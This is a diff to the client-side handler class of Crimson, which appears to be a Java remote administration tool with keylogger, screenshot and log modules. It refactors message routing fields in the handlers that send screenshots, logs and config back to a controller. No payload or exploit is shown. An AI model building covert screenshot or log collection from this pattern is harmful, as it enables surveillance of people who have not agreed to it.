@@ -48,7 +48,6 @@ import com.subterranean_security.crimson.core.util.FileUtil;
 import com.subterranean_security.crimson.core.util.TempUtil;
 import com.subterranean_security.crimson.proto.core.Generator.ClientConfig;
 import com.subterranean_security.crimson.proto.core.Misc.Outcome;
-import com.subterranean_security.crimson.proto.core.net.sequences.ClientControl.RS_ChangeSetting;
 import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.State;
 import com.subterranean_security.crimson.proto.core.net.sequences.Log.LogFile;
 import com.subterranean_security.crimson.proto.core.net.sequences.Log.LogType;
@@ -56,7 +55,6 @@ import com.subterranean_security.crimson.proto.core.net.sequences.Log.RS_Logs;
 import com.subterranean_security.crimson.proto.core.net.sequences.MSG.Message;
 import com.subterranean_security.crimson.proto.core.net.sequences.Network.RQ_MakeDirectConnection;
 import com.subterranean_security.crimson.proto.core.net.sequences.Screenshot.RS_QuickScreenshot;
-import com.subterranean_security.crimson.proto.core.net.sequences.State.RS_ChangeClientState;
 import com.subterranean_security.crimson.proto.core.net.sequences.Update.RS_GetClientConfig;
 import com.subterranean_security.crimson.sc.Logsystem;
 
@@ -132,8 +130,7 @@ public class MiscExe extends Exelet implements ExeI {
 		}
 
 		if (outcome != null) {
-			connector.write(Message.newBuilder().setId(m.getId()).setRid(m.getSid())
-					.setRsChangeClientState(RS_ChangeClientState.newBuilder().setOutcome(outcome)).build());
+			connector.write(Message.newBuilder().setId(m.getId()).setTo(m.getFrom()).setRsOutcome(outcome));
 
 		}
 
@@ -144,7 +141,7 @@ public class MiscExe extends Exelet implements ExeI {
 	}
 
 	public void rq_get_client_config(Message m) {
-		NetworkStore.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(LcvidStore.cvid)
+		NetworkStore.route(Message.newBuilder().setId(m.getId()).setTo(m.getFrom()).setFrom(LcvidStore.cvid)
 				.setRsGetClientConfig(RS_GetClientConfig.newBuilder().setConfig(ConfigStore.getConfig())));
 	}
 
@@ -175,7 +172,7 @@ public class MiscExe extends Exelet implements ExeI {
 			e.printStackTrace();
 			return;
 		}
-		NetworkStore.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(LcvidStore.cvid)
+		NetworkStore.route(Message.newBuilder().setId(m.getId()).setTo(m.getFrom()).setFrom(LcvidStore.cvid)
 				.setRsQuickScreenshot(RS_QuickScreenshot.newBuilder().setBin(ByteString.copyFrom(baos.toByteArray()))));
 		try {
 			baos.close();
@@ -196,7 +193,7 @@ public class MiscExe extends Exelet implements ExeI {
 			}
 		}
 		NetworkStore
-				.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(LcvidStore.cvid).setRsLogs(rs));
+				.route(Message.newBuilder().setId(m.getId()).setTo(m.getFrom()).setFrom(LcvidStore.cvid).setRsLogs(rs));
 	}
 
 	public void rq_change_setting(Message m) {
@@ -241,8 +238,8 @@ public class MiscExe extends Exelet implements ExeI {
 				}
 			}
 		} finally {
-			NetworkStore.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(LcvidStore.cvid)
-					.setRsChangeSetting(RS_ChangeSetting.newBuilder().setResult(outcome)));
+			NetworkStore.route(Message.newBuilder().setId(m.getId()).setTo(m.getFrom()).setFrom(LcvidStore.cvid)
+					.setRsOutcome(outcome));
 		}
 
 	}
